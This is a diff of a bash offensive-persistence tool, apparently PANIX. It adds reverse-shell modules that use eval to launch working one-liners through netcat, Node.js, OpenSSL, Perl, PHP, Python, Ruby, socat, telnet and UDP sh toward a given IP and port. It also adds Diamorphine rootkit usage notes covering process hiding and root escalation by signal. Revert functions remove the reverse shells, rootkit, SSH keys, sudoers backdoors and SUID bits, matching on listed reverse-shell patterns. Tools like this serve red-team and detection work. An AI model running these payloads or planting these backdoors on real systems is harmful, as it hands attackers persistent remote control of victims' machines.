+				echo "[-] nawk is not available on this system. Cannot use Nawk for reverse shell."
+			fi
+			;;
+		nc )
+			# Ref: https://gtfobins.github.io/gtfobins/nc/#reverse-shell
+			echo "[!] Checking for Netcat (nc.traditional)..."
+			if command -v nc.traditional &>/dev/null; then
+				payload="nc.traditional -e /bin/sh $ip $port"
+				echo "[+] nc.traditional is available. Executing reverse shell on $ip:$port..."
+				eval "$payload &"
+			else
+				echo "[-] nc.traditional is not available on this system. Cannot use nc.traditional for reverse shell."
+			fi
+			;;
+		node )
+			# Ref: https://gtfobins.github.io/gtfobins/node/#reverse-shell
+			echo "[!] Checking for Node.js..."
+			if command -v node &>/dev/null; then
+				echo "[+] Node.js is available. Executing reverse shell on $ip:$port..."
+				payload="export RHOST=$ip; export RPORT=$port; node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
+				eval "$payload &"
+			else
+				echo "[-] Node.js is not available on this system. Cannot use Node.js for reverse shell."
+			fi
+			;;
+		openssl )
+			# Ref: https://gtfobins.github.io/gtfobins/openssl/#reverse-shell
+			echo "[!] Checking for OpenSSL..."
+			if command -v openssl &>/dev/null; then
+				echo "[+] OpenSSL is available. Executing reverse shell on $ip:$port..."
+
+				echo ""
+				echo "Make sure you have a correct listener up and running on the target host"
+				echo "Use the following commands to set it up if you haven't already:"
+				echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
+				echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"
+				echo ""
+
+				payload="RHOST=$ip; RPORT=$port; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s; rm /tmp/s"
+				eval "$payload &"
+			else
+				echo "[-] OpenSSL is not available on this system. Cannot use OpenSSL for reverse shell."
+			fi
+			;;
+		perl )
+			# Ref: https://gtfobins.github.io/gtfobins/perl/#reverse-shell
+			echo "[!] Checking for Perl..."
+			if command -v perl &>/dev/null; then
+				echo "[+] Perl is available. Executing reverse shell on $ip:$port..."
+				payload="export RHOST=$ip; export RPORT=$port; setsid nohup perl -e 'use Socket;\$i=\"\$ENV{RHOST}\";\$p=\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+				eval "$payload &"
+			else
+				echo "[-] Perl is not available on this system. Cannot use Perl for reverse shell."
+			fi
+			;;
+		php )
+			# Ref: https://gtfobins.github.io/gtfobins/php/#reverse-shell
+			echo "[!] Checking for PHP..."
+			if command -v php &>/dev/null; then
+				echo "[+] PHP is available. Executing reverse shell on $ip:$port..."
+				payload="export RHOST=$ip; export RPORT=$port; setsid nohup php -r '\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+				eval "$payload &"
+			else
+				echo "[-] PHP is not available on this system. Cannot use PHP for reverse shell."
+				payload=""
+			fi
+			;;
+		python )
+			# Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
+			echo "[!] Checking for Python..."
+			if command -v python &>/dev/null; then
+				echo "[+] Python is available. Executing reverse shell on $ip:$port..."
+				payload="nohup setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+				eval "$payload &"
+			else
+				echo "[-] Python is not available on this system. Cannot use Python for reverse shell."
+			fi
+			;;
+		python3 )
+			# Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
+			echo "[!] Checking for Python3..."
+			if command -v python3 &>/dev/null; then
+				echo "[+] Python3 is available. Executing reverse shell on $ip:$port..."
+				payload="nohup setsid python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+				eval "$payload &"
+			else
+				echo "[-] Python3 is not available on this system. Cannot use Python3 for reverse shell."
+			fi
+			;;
+		ruby )
+			# Ref: https://gtfobins.github.io/gtfobins/ruby/#reverse-shell
+			echo "[!] Checking for Ruby..."
+			if command -v ruby &>/dev/null; then
+				echo "[+] Ruby is available. Executing reverse shell on $ip:$port..."
+				payload="export RHOST=$ip; export RPORT=$port; nohup setsid ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+				eval "$payload &"
+			else
+				echo "[-] Ruby is not available on this system. Cannot use Ruby for reverse shell."
+			fi
+			;;
+		sh-udp )
+			# Ref: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
+			echo "[!] Checking for Sh..."
+			if command -v sh &>/dev/null; then
+				echo "[+] Sh found. Executing reverse shell on $ip:$port..."
+				payload="setsid nohup sh -i >& /dev/udp/$ip/$port 0>&1"
+				eval "$payload &"
+			else
+				echo "[-] Sh is not available on this system. Cannot use Sh for reverse shell."
+			fi
+			;;
+		socat )
+			# Ref: https://gtfobins.github.io/gtfobins/socat/#reverse-shell
+			echo "[!] Checking for Socat..."
+			if command -v socat &>/dev/null; then
+				echo "[+] Socat is available. Executing reverse shell to $ip:$port..."
+
+				echo ""
+				echo "Make sure you have a correct listener up and running on the target host"
+				echo "Use the following commands to set it up if you haven't already:"
+				echo "socat FILE:`tty`,raw,echo=0 TCP:$ip:$port"
+				echo ""
+
+				payload="RHOST=$ip; RPORT=$port; socat tcp-connect:\$RHOST:\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+				eval "$payload &"
+			else
+				echo "[-] Socat is not available on this system. Cannot use Socat for reverse shell."
+			fi
+			;;
+		telnet )
+			# Ref: https://gtfobins.github.io/gtfobins/telnet/#reverse-shell
+			echo "[!] Checking for Telnet..."
+			if command -v telnet &>/dev/null; then
+				echo "[+] Telnet is available. Executing reverse shell to $ip:$port..."
+				payload="RHOST=$ip; RPORT=$port; TF=\$(mktemp -u); mkfifo \$TF && telnet \$RHOST \$RPORT 0<\$TF | /bin/sh 1>\$TF"
+				eval "$payload &"
+			else
+				echo "[-] Telnet is not available on this system. Cannot use Telnet for reverse shell."
+			fi
+			;;
+		*)
+			echo "Error: Unsupported mechanism: $mechanism"
+			echo "Try './panix.sh --reverse-shell --help' for more information."
+			exit 1
+			;;
+	esac
+}
+
+# Revert Module: revert_reverse_shell.sh
+revert_reverse_shell() {
+	usage_revert_reverse_shell() {
+		echo "Usage: ./panix.sh --revert reverse-shell"
+		echo "Reverts any changes made by the setup_reverse_shell module."
+	}
+
+	# Ensure the function is run as root
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# List of possible mechanisms used in the setup function
+	local mechanisms=("awk" "bash" "busybox" "gawk" "ksh" "lua" "nawk" "nc" "node" "openssl" "perl" "php" "python" "python3" "ruby" "sh-udp" "socat" "telnet")
+
+	# Function to kill processes based on patterns
+	kill_processes() {
+		local pattern="$1"
+		local pids
+
+		# Use pgrep to find PIDs matching the pattern
+		pids=$(pgrep -f "$pattern")
+
+		if [[ -n "$pids" ]]; then
+			echo "[+] Terminating processes matching pattern '$pattern'..."
+			# Terminate each PID individually to handle cases where some PIDs may no longer exist
+			for pid in $pids; do
+				if kill -9 "$pid" 2>/dev/null; then
+					echo "[+] Successfully terminated PID $pid"
+				else
+					echo "[-] Failed to terminate PID $pid (No such process)"
+				fi
+			done
+		fi
+	}
+
+	# Iterate over mechanisms and attempt to kill associated processes
+	for mech in "${mechanisms[@]}"; do
+		case $mech in
+			awk|gawk|nawk)
+				kill_processes "awk -v RHOST"
+				;;
+			bash)
+				kill_processes "bash -i >& /dev/tcp"
+				;;
+			busybox)
+				kill_processes "busybox nc"
+				;;
+			ksh)
+				kill_processes "ksh -c 'ksh -i'"
+				;;
+			lua)
+				kill_processes "lua -e"
+				;;
+			nc)
+				kill_processes "nc.traditional -e /bin/sh"
+				kill_processes "nc -e /bin/sh"
+				;;
+			node)
+				kill_processes "node -e"
+				;;
+			openssl)
+				kill_processes "openssl s_client"
+				;;
+			perl)
+				kill_processes "perl -e"
+				;;
+			php)
+				kill_processes "php -r"
+				;;
+			python)
+				kill_processes "python -c"
+				;;
+			python3)
+				kill_processes "python3 -c"
+				;;
+			ruby)
+				kill_processes "ruby -rsocket -e"
+				;;
+			sh-udp)
+				kill_processes "sh -i >& /dev/udp"
+				;;
+			socat)
+				kill_processes "socat tcp-connect"
+				;;
+			telnet)
+				kill_processes "telnet"
+				;;
+			*)
+				# Do nothing for unrecognized mechanisms
+				;;
+		esac
+	done
+
+	return 0
 }
 
 # Module: setup_rootkit.sh
@@ -3297,6 +4892,7 @@ setup_rootkit() {
 		echo "--examples                 Display command examples"
 		echo "--secret <secret>          Specify the secret"
 		echo "--identifier <identifier>  Specify the identifies"
+		echo "--help|-h                  Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -3355,6 +4951,11 @@ setup_rootkit() {
 		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
 		exit 1
 	fi
+
+    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04"
+    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7"
+    echo "[!] I cannot guarantee that it will work on other distributions"
+    sleep 5
 
     mkdir -p $rk_path
 
@@ -3457,6 +5058,133 @@ setup_rootkit() {
 	make -C ${rk_path} clean
 
 	echo "[+] Diamorphine rootkit has been installed."
+    echo "[+] The secret is: ${secret}"
+    echo "[+] The identifier is: ${identifier}"
+
+    echo "[+] kill -31 pid: hide/unhide any process;"
+    echo "[+] kill -63 pid: turns the module (in)visible;"
+    echo "[+] kill -64 pid: become root;"
+    echo "[+] Any file starting with ${secret} is hidden."
+    echo "[+] Source: https://github.com/m0nad/Diamorphine"
+}
+
+# Revert Module: revert_rootkit.sh
+revert_rootkit() {
+	usage_revert_rootkit() {
+		echo "Usage: ./panix.sh --revert rootkit"
+		echo "Reverts any changes made by the setup_rootkit module."
+	}
+
+	# Ensure the function is run as root
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Function to remove a file if it exists
+	remove_file() {
+		local file_path="$1"
+		if [[ -f "$file_path" ]]; then
+			rm -f "$file_path"
+			echo "[+] Removed file: $file_path"
+		else
+			echo "[-] File not found: $file_path"
+		fi
+	}
+
+	# Function to remove a directory if it exists
+	remove_directory() {
+		local dir_path="$1"
+		if [[ -d "$dir_path" ]]; then
+			rm -rf "$dir_path"
+			echo "[+] Removed directory: $dir_path"
+		else
+			echo "[-] Directory not found: $dir_path"
+		fi
+	}
+
+	# Function to send kill -63 0 to unload the module
+	unload_module_signal() {
+		echo "[+] Sending 'kill -63 0' to unload the rootkit module..."
+		kill -63 0
+		if [[ $? -ne 0 ]]; then
+			echo "[-] Failed to send signal to unload the rootkit module."
+			echo "You may need to unload it manually."
+		else
+			echo "[+] Signal sent successfully."
+		fi
+	}
+
+	# Function to unload a kernel module
+	unload_kernel_module() {
+		local module_name="$1"
+		if lsmod | grep -q "^${module_name}\b"; then
+			echo "[+] Unloading kernel module: $module_name"
+			rmmod -f "$module_name"
+			if [[ $? -eq 0 ]]; then
+				echo "[+] Kernel module '$module_name' unloaded successfully."
+			else
+				echo "[-] Failed to unload kernel module '$module_name'."
+			fi
+		else
+			echo "[-] Kernel module '$module_name' is not loaded."
+		fi
+	}
+
+	rk_path="/dev/shm/.rk"
+	if [[ -d "$rk_path" ]]; then
+
+		# Step 1: Send kill -63 0 signal to prepare unloading
+		unload_module_signal
+
+		# Step 2: Identify and unload kernel modules
+		echo "[+] Identifying loaded rootkit kernel modules in $rk_path..."
+
+		# Find all .ko files in rk_path
+		ko_files=("$rk_path"/*.ko)
+
+		if [[ ! -e "${ko_files[0]}" ]]; then
+			echo "[-] No .ko files found in $rk_path."
+		else
+			for ko_file in "${ko_files[@]}"; do
+				module_name=$(basename "$ko_file" .ko)
+				unload_kernel_module "$module_name"
+			done
+		fi
+	else
+		echo "[-] Rootkit directory '$rk_path' not found. Skipping module unloading."
+	fi
+
+	# Step 3: Remove kernel module files
+	if [[ -d "$rk_path" ]]; then
+		echo "[+] Removing kernel module files from $rk_path..."
+		for ko_file in "$rk_path"/*.ko; do
+			if [[ -f "$ko_file" ]]; then
+				remove_file "$ko_file"
+			fi
+		done
+	fi
+
+	# Step 4: Remove /dev/shm/.rk directory
+	remove_directory "$rk_path"
+
+	# Step 5: Remove downloaded files in /tmp
+	echo "[+] Removing downloaded files in /tmp..."
+	remove_directory "/tmp/diamorphine"
+	remove_file "/tmp/diamorphine.zip"
+	remove_file "/tmp/diamorphine.tar"
+	remove_directory "/tmp/Diamorphine.git"
+
+	# Step 6: Reload kernel modules to ensure no remnants remain
+	echo "[+] Reloading kernel modules..."
+	depmod -a
+	if [[ $? -eq 0 ]]; then
+		echo "[+] Kernel modules reloaded successfully."
+	else
+		echo "[-] Failed to reload kernel modules."
+	fi
+
+	return 0
 }
 
 # Module: setup_shell_profile.sh
@@ -3477,6 +5205,7 @@ setup_shell_profile() {
 		echo "--custom                     Use custom shell profile settings (make sure they are valid!)"
 		echo "  --path <path>                Specify custom profile path"
 		echo "  --command <command>          Specify custom persistence command (no validation)"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -3560,6 +5289,176 @@ setup_shell_profile() {
 	echo "[+] Shell profile persistence established!"
 }
 
+# Revert Module: revert_shell_profile.sh
+revert_shell_profile() {
+	usage_revert_shell_profile() {
+		echo "Usage: ./panix.sh --revert shell-profile"
+		echo "Reverts any changes made by the setup_shell_profile module."
+	}
+
+	# Determine if the script is run as root
+	if [[ "$(id -u)" -eq 0 ]]; then
+		is_root=true
+	else
+		is_root=false
+	fi
+
+	# Function to backup a file if not already backed up
+	backup_file() {
+		local file_path="$1"
+		if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
+			cp "$file_path" "${file_path}.backup"
+			echo "[+] Backup of $file_path created at ${file_path}.backup"
+		elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
+			echo "[+] Backup of $file_path already exists at ${file_path}.backup"
+		else
+			echo "[-] File not found: $file_path. Skipping backup."
+		fi
+	}
+
+	remove_lines_matching_pattern() {
+		local pattern="$1"
+		local file="$2"
+
+		# Use '|' as the delimiter in sed to avoid conflict with '/'
+		if grep -q "$pattern" "$file"; then
+			sed -i "\|$pattern|d" "$file"
+			echo "[+] Removed lines matching pattern: '$pattern' from $file"
+		fi
+	}
+
+	# Define shell profile files to check
+	system_shell_profiles=(
+		"/etc/profile"
+		"/etc/bash.bashrc"
+		"/etc/zsh/zshrc"
+		"/etc/profile.d/*.sh"
+	)
+
+	user_shell_profiles=(
+		"$HOME/.bash_profile"
+		"$HOME/.bashrc"
+		"$HOME/.profile"
+		"$HOME/.zshrc"
+	)
+
+	# Define malicious patterns indicative of a reverse shell
+	malicious_patterns=(
+		"nohup bash -i > /dev/tcp/"
+		"setsid nohup bash -c 'bash -i >& /dev/tcp/"
+		"bash -i >& /dev/tcp/"
+		"bash -c 'sh -i >& /dev/tcp/"
+		"bash -i > /dev/tcp/"
+		"sh -i >& /dev/udp/"
+		"bash -c 'bash -i >& /dev/tcp/"
+		"bash -c 'sh -i >& /dev/udp/"
+		"nohup setsid bash -c 'sh -i >& /dev/tcp/"
+		"nohup setsid sh -c 'sh -i >& /dev/tcp/"
+		"nohup setsid"
+	)
+
+	# Define system users to skip (modify this array if certain users should not be processed)
+	system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
+
+	# Function to check if a user is a system user
+	is_system_user() {
+		local user="$1"
+		for sys_user in "${system_users[@]}"; do
+			if [[ "$user" == "$sys_user" ]]; then
+				return 0
+			fi
+		done
+		return 1
+	}
+
+	# Function to process a single user's shell profiles
+	process_user_shell_profiles() {
+		local user_home="$1"
+		local user_name="$2"
+
+		echo "[+] Processing shell profiles for user '$user_name' at: $user_home"
+
+		for profile in "${user_shell_profiles[@]}"; do
+			# Replace $HOME with the actual user home directory
+			local expanded_profile="${profile/#\$HOME/$user_home}"
+
+			if [[ -f "$expanded_profile" ]]; then
+				backup_file "$expanded_profile"
+				for pattern in "${malicious_patterns[@]}"; do
+					remove_lines_matching_pattern "$pattern" "$expanded_profile"
+				done
+			else
+				echo "[-] Shell profile file not found: $expanded_profile. Skipping."
+			fi
+		done
+	}
+
+	# Function to process system-wide shell profiles
+	process_system_shell_profiles() {
+		echo "[+] Processing system-wide shell profiles."
+
+		for profile in "${system_shell_profiles[@]}"; do
+			# Handle wildcard profiles like /etc/profile.d/*.sh
+			if [[ "$profile" == *.sh ]]; then
+				for script in $profile; do
+					if [[ -f "$script" ]]; then
+						backup_file "$script"
+						for pattern in "${malicious_patterns[@]}"; do
+							remove_lines_matching_pattern "$pattern" "$script"
+						done
+					fi
+				done
+				continue
+			fi
+
+			if [[ -f "$profile" ]]; then
+				echo "[+] Processing shell profile file: $profile"
+				backup_file "$profile"
+				for pattern in "${malicious_patterns[@]}"; do
+					remove_lines_matching_pattern "$pattern" "$profile"
+				done
+			else
+				echo "[-] Shell profile file not found: $profile. Skipping."
+			fi
+		done
+	}
+
+	# Main logic based on execution context
+	if [[ "$is_root" == true ]]; then
+		echo "[+] Running as root. Reverting shell profiles for root and all non-system users."
+
+		# Revert system-wide shell profiles
+		process_system_shell_profiles
+
+		# Iterate over all user directories in /home
+		for user_home in /home/*; do
+			if [[ -d "$user_home" ]]; then
+				user_name=$(basename "$user_home")
+				if is_system_user "$user_name"; then
+					echo "[-] Skipping system user '$user_name'."
+					continue
+				fi
+				process_user_shell_profiles "$user_home" "$user_name"
+			fi
+		done
+	else
+		# Non-root execution: revert shell profiles for the current user only
+		current_user=$(whoami)
+		user_home=$(eval echo "~$current_user")
+		echo "[+] Running as non-root. Reverting shell profiles for user '$current_user' at: $user_home"
+
+		process_user_shell_profiles "$user_home" "$current_user"
+	fi
+
+	echo "[+] Shell profiles reverted successfully."
+	echo "[!] Restart your shell sessions to apply changes."
+	echo "[!] Run 'source /etc/profile' to apply changes system-wide (if applicable)."
+	echo "[!] Run 'source ~/.bash_profile' or 'source ~/.bashrc' to apply changes to your user session."
+	echo "[!] Run 'exec bash' or 'exec zsh' to restart the current shell session."
+
+	return 0
+}
+
 # Module: setup_ssh_key.sh
 setup_ssh_key() {
 	local default=0
@@ -3576,11 +5475,13 @@ setup_ssh_key() {
 			echo "--default                    Use default SSH key settings"
 			echo "--custom                     Use custom SSH key settings"
 			echo "  --user <user>               Specify user for custom SSH key"
+		    echo "--help|-h                    Show this help message"
 		else
 			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
 			echo "Low Privileged User Options:"
 			echo "--examples                   Display command examples"
 			echo "--default                    Use default SSH key settings"
+		    echo "--help|-h                    Show this help message"
 		fi
 	}
 
@@ -3676,6 +5577,165 @@ setup_ssh_key() {
 	echo "[+] SSH key persistence established!"
 }
 
+# Revert Module: revert_ssh_key.sh
+revert_ssh_key() {
+    usage_revert_ssh_key() {
+        echo "Usage: ./panix.sh --revert ssh-key"
+        echo "Reverts any changes made by the setup_ssh_key module."
+    }
+
+    # Determine if the script is run as root
+    if [[ "$(id -u)" -eq 0 ]]; then
+        is_root=true
+    else
+        is_root=false
+    fi
+
+    # Function to backup a file if not already backed up
+    backup_file() {
+        local file_path="$1"
+        if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
+            cp "$file_path" "${file_path}.backup"
+            echo "[+] Backup of $file_path created at ${file_path}.backup"
+        elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
+            echo "[!] Backup of $file_path already exists at ${file_path}.backup"
+        else
+            echo "[-] File not found: $file_path. Skipping backup."
+        fi
+    }
+
+    # Function to remove a file if it exists
+    remove_file() {
+        local file_path="$1"
+        if [[ -f "$file_path" ]]; then
+            rm -f "$file_path"
+            echo "[+] Removed file: $file_path"
+        else
+            echo "[-] File not found: $file_path"
+        fi
+    }
+
+    # Function to remove a public key from authorized_keys
+    remove_public_key() {
+        local pub_key_content="$1"
+        local auth_keys="$2"
+        if grep -Fq "$pub_key_content" "$auth_keys"; then
+            sed -i "\|$pub_key_content|d" "$auth_keys"
+            echo "[+] Removed public key from: $auth_keys"
+        else
+            echo "[-] Public key not found in: $auth_keys"
+        fi
+    }
+
+    # Function to process a single user's SSH keys
+    process_user_ssh_keys() {
+        local user_home="$1"
+        local user_name="$2"
+
+        local ssh_dir="$user_home/.ssh"
+        local private_key_path="$ssh_dir/id_rsa1822"
+        local public_key_path="$ssh_dir/id_rsa1822.pub"
+        local authorized_keys_path="$ssh_dir/authorized_keys"
+
+        # Check if .ssh directory exists
+        if [[ ! -d "$ssh_dir" ]]; then
+            echo "[-] .ssh directory not found for user '$user_name' at: $ssh_dir. Skipping."
+            return
+        fi
+
+        # Backup authorized_keys
+        if [[ -f "$authorized_keys_path" ]]; then
+            backup_file "$authorized_keys_path"
+        else
+            echo "[-] authorized_keys file not found at: $authorized_keys_path. Skipping backup."
+        fi
+
+        # Check if public key exists
+        if [[ -f "$public_key_path" ]]; then
+            # Read the public key content
+            pub_key_content=$(cat "$public_key_path")
+
+            # Remove the public key entry from authorized_keys
+            if [[ -f "$authorized_keys_path" ]]; then
+                remove_public_key "$pub_key_content" "$authorized_keys_path"
+            else
+                echo "[-] authorized_keys file not found at: $authorized_keys_path. Skipping removal of public key."
+            fi
+
+            # Remove the SSH key files
+            remove_file "$private_key_path"
+            remove_file "$public_key_path"
+
+            # Optionally, remove the .ssh directory if it's empty
+            if [[ -d "$ssh_dir" ]]; then
+                if [[ -z "$(ls -A "$ssh_dir")" ]]; then
+                    rm -rf "$ssh_dir"
+                    echo "[+] Removed empty .ssh directory: $ssh_dir"
+                else
+                    echo "[+] .ssh directory not empty after removals: $ssh_dir"
+                fi
+            fi
+        else
+            echo "[-] Public key file not found at: $public_key_path. Skipping removal from authorized_keys."
+        fi
+    }
+
+    # Define system users to skip (if any). Modify this array if certain users should not be processed.
+    system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
+
+    # Function to check if a user is a system user
+    is_system_user() {
+        local user="$1"
+        for sys_user in "${system_users[@]}"; do
+            if [[ "$user" == "$sys_user" ]]; then
+                return 0
+            fi
+        done
+        return 1
+    }
+
+    # Collect users to process
+    users_to_process=()
+
+    if [[ "$is_root" == true ]]; then
+        echo "[+] Running as root. Reverting SSH keys for root and all non-system users."
+
+        # Add root user
+        users_to_process+=("root")
+
+        # Iterate over all user directories in /home
+        for user_home in /home/*; do
+            if [[ -d "$user_home" ]]; then
+                user_name=$(basename "$user_home")
+                if is_system_user "$user_name"; then
+                    echo "[-] Skipping system user '$user_name'."
+                    continue
+                fi
+                users_to_process+=("$user_name")
+            fi
+        done
+    else
+        # Non-root execution: process only the current user
+        current_user=$(whoami)
+        echo "[+] Running as non-root. Reverting SSH keys for user '$current_user'."
+        users_to_process+=("$current_user")
+    fi
+
+    # Process each user
+    for user in "${users_to_process[@]}"; do
+        if [[ "$user" == "root" ]]; then
+            user_home="/root"
+        else
+            user_home="/home/$user"
+        fi
+
+        echo "[+] Processing SSH keys for user '$user' at: $user_home/.ssh"
+        process_user_ssh_keys "$user_home" "$user"
+    done
+
+    return 0
+}
+
 # Module: setup_sudoers_backdoor.sh
 setup_sudoers_backdoor() {
 	local username=""
@@ -3689,6 +5749,7 @@ setup_sudoers_backdoor() {
 		echo "Usage: ./panix.sh --sudoers-backdoor [OPTIONS]"
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
+		echo "--help|-h                  Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -3731,6 +5792,74 @@ setup_sudoers_backdoor() {
 	echo "[+] Sudoers backdoor persistence established!"
 }
 
+# Revert Module: revert_sudoers_backdoor.sh
+revert_sudoers() {
+	usage_revert_sudoers() {
+		echo "Usage: ./panix.sh --revert sudoers"
+		echo "Reverts any changes made by the setup_sudoers_backdoor module."
+	}
+
+	# Ensure the function is run as root
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Function to backup a file if not already backed up
+	backup_file() {
+		local file_path="$1"
+		if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
+			cp "$file_path" "${file_path}.backup"
+			echo "[+] Backup of $file_path created at ${file_path}.backup"
+		elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
+			echo "[!] Backup of $file_path already exists at ${file_path}.backup"
+		else
+			echo "[-] File not found: $file_path. Skipping backup."
+		fi
+	}
+
+	# Function to remove a sudoers backdoor file
+	remove_sudoers_backdoor() {
+		local sudoers_file="$1"
+
+		if [[ -f "$sudoers_file" && "$sudoers_file" != *.backup ]]; then
+			# Backup the sudoers file before removal
+			backup_file "$sudoers_file"
+
+			# Remove the sudoers backdoor
+			rm -f "$sudoers_file"
+			if [[ $? -eq 0 ]]; then
+				echo "[+] Removed sudoers backdoor file: $sudoers_file"
+			else
+				echo "[-] Failed to remove sudoers backdoor file: $sudoers_file"
+			fi
+		else
+			echo "[-] Sudoers backdoor file not found: $sudoers_file. Skipping."
+		fi
+	}
+
+	# Define the sudoers backdoor pattern
+	sudoers_pattern='^[a-zA-Z0-9._-]+ ALL=\(ALL\) NOPASSWD:ALL$'
+
+	# Iterate over all files in /etc/sudoers.d/
+	for sudoers_file in /etc/sudoers.d/*; do
+		# Ensure it's a regular file
+		if [[ -f "$sudoers_file" ]]; then
+			# Check if the file contains any lines matching the sudoers backdoor pattern
+			if grep -Eq "$sudoers_pattern" "$sudoers_file"; then
+				echo "[+] Identified sudoers backdoor in file: $sudoers_file"
+				remove_sudoers_backdoor "$sudoers_file"
+			else
+				echo "[-] No sudoers backdoor found in file: $sudoers_file. Skipping."
+			fi
+		else
+			echo "[-] Not a regular file: $sudoers_file. Skipping."
+		fi
+	done
+
+	return 0
+}
+
 # Module: setup_suid_backdoor.sh
 setup_suid_backdoor() {
 	local default=0
@@ -3748,6 +5877,7 @@ setup_suid_backdoor() {
 		echo "--default                    Use default SUID settings"
 		echo "--custom                     Use custom SUID settings"
 		echo "  --binary <binary>            Specify the binary to give SUID permissions"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -3837,6 +5967,59 @@ setup_suid_backdoor() {
 	echo "[+] SUID backdoor persistence established!"
 }
 
+# Revert Module: revert_suid_backdoor.sh
+revert_suid() {
+	usage_revert_suid() {
+		echo "Usage: ./panix.sh --revert suid"
+		echo "Reverts any changes made by the setup_suid_backdoor module."
+	}
+
+	# Ensure the function is run as root
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Define the default binaries that had SUID bits set
+	default_binaries=("find" "dash" "python" "python3")
+
+	# Function to remove SUID bit from a binary
+	remove_suid_bit() {
+		local binary_path="$1"
+		if [[ -f "$binary_path" ]]; then
+			chmod u-s "$binary_path"
+			if [[ $? -eq 0 ]]; then
+				echo "[+] Removed SUID bit from $binary_path"
+			else
+				echo "[-] Failed to remove SUID bit from $binary_path"
+			fi
+		else
+			echo "[-] Binary not found: $binary_path. Skipping."
+		fi
+	}
+
+	# Function to revert SUID for default binaries
+	revert_default_suid() {
+		echo "[+] Reverting SUID bits on default binaries..."
+
+		for bin in "${default_binaries[@]}"; do
+			if command -v "$bin" &> /dev/null; then
+				bin_path=$(command -v "$bin")
+				# Resolve symbolic links to get the real path
+				real_bin_path=$(realpath "$bin_path")
+				remove_suid_bit "$real_bin_path"
+			else
+				echo "[-] Binary '$bin' not found on the system. Skipping."
+			fi
+		done
+	}
+
+	# Revert default SUID bits
+	revert_default_suid
+
+	return 0
+}
+
 # Module: setup_system_binary_backdoor.sh
 setup_system_binary_backdoor() {
 	local default=0
@@ -3862,6 +6045,7 @@ setup_system_binary_backdoor() {
 		echo "  --binary <binary>            Specify the binary to backdoor"
 		echo "  --command <command>          Specify the custom command to execute"
 		echo "  --warning                    This may interrupt your system.. Be careful!"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -3972,6 +6156,63 @@ setup_system_binary_backdoor() {
 	fi
 }
 
+# Revert Module: revert_system_binary_backdoor.sh
+revert_system_binary() {
+	usage_revert_system_binary() {
+		echo "Usage: ./panix.sh --revert system-binary"
+		echo "Reverts any changes made by the setup_system_binary_backdoor module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Default binaries used in the setup function
+	local default_binaries=("cat" "ls")
+
+	# Function to restore a binary
+	restore_binary() {
+		local binary_name="$1"
+		local binary_path
